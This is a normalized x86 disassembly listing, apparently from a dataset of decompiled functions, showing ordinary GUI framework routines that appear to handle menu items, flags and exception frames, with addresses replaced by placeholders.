mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_461b1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4617a0
mov edx eax
mov ecx esi
mov eax ebx
call sub_46192c
pop esi
pop ebx
retn
sub_461b38
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_461b04
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_4619e0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45eddc
sub_461b60
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_461ba4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_461ba4
jmp r-xdata
mov eax ebx
call sub_45fc04
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_46387c
sub_461bfc
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebx + 0x4c ] eax
sub_461c24
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4032b0
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_461eb8
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4034ac
mov edx ebx
mov eax edi
call sub_421440
mov eax ebx
mov si 0xffee
call sub_4034ac
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_461c94
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ esi + 0x4c ] eax
sub_461cc8
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4617a0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4617b0
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_461d08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_461b38
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_461b1c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_461b1c
sub_461d6c
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_461630
sub_461d98
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_461608
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_461678
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_4616cc
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_404100
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_4617f8
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_461744
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_4617d4
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4617e8
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_461eb8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_461788
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4034ac
sub_461edc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461efc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461f1c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461f3c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461f5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461f7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461f9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461fbc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461fdc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_461ffc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419090
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_45c258
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_45c390
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_45c3f0
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_45c0f0
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_45c4b0
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_462074
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_461788
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_461c24
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4620c8
jmp r-xdata
xor edx edx
mov eax esi
call sub_45fb8c
sub_4620c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_45d560
mov eax ebx
call sub_462138
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_421440
sub_462110
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_462110
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45f260
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_461ba4
mov eax ebx
pop esi
pop ebx
retn
sub_46214c
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c7b4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_40460c
sub_46217c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404144
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_462200
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_462322
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40436c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40436c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4045cc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462329
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404654
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40442c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40436c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4045cc
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_40442c
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_462360
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4627ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404144
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4627c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4617a0
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404144
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462806
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_4040d0
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_4040d0
lea eax [ ebp - 0x18 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
call sub_4629b4
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4044b8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_46217c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
mov eax [ ebp - 0x20 ]
call sub_4032b0
mov eax [ ebp - 0x14 ]
call sub_4032b0
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_46217c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40436c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_464258
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407f04
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_404100
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c7b4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c7b4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
push eax
mov edx esi
mov eax ebx
call sub_4617b0
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4045cc
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407f04
push ebp
mov eax [ ebp - 0x2c ]
call sub_46214c
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_46214c
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c7b4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404144
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4617b0
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_4617b0
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4641c4
mov edx [ ebp - 0x40 ]
pop eax
call sub_404100
mov edx esi
mov eax ebx
call sub_4617b0
push eax
mov edx esi
mov eax ebx
call sub_4617b0
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40436c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4045cc
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_462200
mov eax [ ebp - 0x18 ]
call sub_40436c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_40460c
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404654
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_462200
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_46285c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4617a0
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4617a0
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4629e0
test al al
je r-xdata
mov eax esi
call sub_4617a0
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
call sub_462838
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_4617b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
call sub_462838
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4617b0
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_4617b0
call sub_462838
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4629b4
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4629b4
and eax 0x7f
mov al [ eax + rw-data ]
sub_4629e0
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4629e0
and eax 0x7f
mov al [ eax + rw-data ]
sub_462a0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f6f4
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_421370
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_463738
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_462aa8
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4032b0
mov eax [ esi + 0x44 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_462b1c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_462b1c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45f260
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_461ba4
mov eax ebx
pop esi
pop ebx
retn
sub_462b5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_4617a0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_4617b0
call sub_462b5c
pop ecx
test al al
je r-xdata
sub_462bf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_462b5c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
